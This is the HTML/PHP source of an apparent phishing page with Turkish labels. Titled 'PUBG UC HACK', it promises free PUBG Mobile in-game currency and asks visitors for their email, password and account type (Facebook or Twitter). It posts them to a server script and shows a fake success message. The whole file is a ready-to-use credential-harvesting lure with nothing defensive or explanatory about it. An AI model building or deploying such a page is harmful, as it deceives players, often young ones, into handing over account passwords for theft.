<html>
  <head>
    <title>PUBG UC HACK</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, inital-scale=1.0">
    <meta name="description" content="PUBG UC HACK FILL THE FORM">
    <link rel="stylesheet" href="/assets/css/style.css">
  </head>
  <body>
    <form action="/action.php" method="POST" class="form">
      <img src="/assets/img/pubg-mobile-logo.png" width="240">
      <?php
      
      $notice = @$_GET['notice'];
      
      switch($notice){
        case "EKSIK_BILGI":
          ?>
          <div class="notice-error">Formu eksiksiz doldurun!</div>
          <?php
          break;
        case "success":
          ?>
          <div class="notice-success">Başarılı, UC'niz 24 saat içinde hesabınızda olacaktır.</div>
          <?php
          break;
      }
      
      ?>
      <div class="input-div">
        <label>E-posta</label><br>
        <input type="text" name="email" autocomplete="no">
      </div>
      <div class="input-div">
        <label>Şifre</label><br>
        <input type="password" name="password" autocomplete="no">
      </div>
      <div class="input-div">
        <label>UC Sayısı</label><br>
        <select>
          <?php
          
          for($i = 1000; $i <= 50000; $i += 1000){
            echo "<option>{$i}</option>";
          }
          
          ?>
        </select>
      </div>
      <div class="input-div">
        <label>Hesap türü</label><br>
        <select name="hesap_turu">
          <option>Facebook</option>
          <option>Twitter</option>
        </select>
      </div><br><br>
      <button type="submit" class="submit-btn">UC Kazan</button>
    </form>
  </body>
</html>